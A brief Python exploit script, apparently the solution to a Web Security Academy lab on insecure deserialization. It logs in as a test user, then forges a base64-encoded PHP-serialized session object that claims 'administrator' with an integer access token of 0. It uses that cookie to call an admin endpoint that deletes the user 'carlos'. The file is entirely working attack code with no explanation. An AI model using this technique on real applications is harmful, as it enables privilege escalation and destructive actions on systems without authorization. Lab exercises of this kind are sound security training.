import requests
import base64

url = "https://ac801f861f63514cc08d329700be0087.web-security-academy.net"

def encode_bs4(e):

	sample_string_bytes = e.encode("ascii")  
	base64_bytes = base64.b64encode(sample_string_bytes)
	base64_string = base64_bytes.decode("ascii")

	return base64_string

def slove(url):

	s = requests.session()

	data = {"username": "wiener", "password": "peter"}
	r1 = s.post(url+ "/login", data=data)
	
	cookie = s.cookies.get_dict()
	
	d = 'O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}'
	payload = encode_bs4(d)

	exploit = s.get(url + "/admin/delete?username=carlos", cookies={'session': payload})

	print(exploit)

slove(url)